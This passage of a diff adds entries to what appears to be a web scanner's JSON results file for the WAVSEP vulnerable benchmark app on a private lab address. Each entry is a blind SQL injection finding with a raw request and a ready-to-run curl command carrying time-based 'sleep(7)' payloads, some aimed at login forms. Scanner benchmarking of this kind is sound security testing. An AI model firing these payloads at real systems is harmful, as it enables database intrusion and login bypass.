+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp?msgid=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp?msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "msgid", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp?username=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp?username=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp?transactionDate=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp?transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter description", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp?description=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp?description=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "description", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp?transactionDate=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp?transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionDate=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp\" -d \"transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp\" -d \"msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp", 
+        "parameter": "msgId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nminBalanace=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp\" -d \"minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgid=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp\" -d \"msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp", 
+        "parameter": "msgid", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp\" -d \"transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp\" -d \"msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp", 
+        "parameter": "msgId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nminBalanace=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp\" -d \"minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgid=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp\" -d \"msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp", 
+        "parameter": "msgid", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27%20or%20sleep%287%29%231&password=letmein", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp\" -d \"username=%27%20or%20sleep%287%29%231&password=letmein\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter password", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=default&password=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp\" -d \"username=default&password=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp", 
+        "parameter": "password", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp\" -d \"msg=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp\" -d \"username=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp\" -d \"msg=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter orderby", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\norderby=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp\" -d \"orderby=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp", 
+        "parameter": "orderby", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgId=sleep%287%29%231", 
+        "level": "1", 
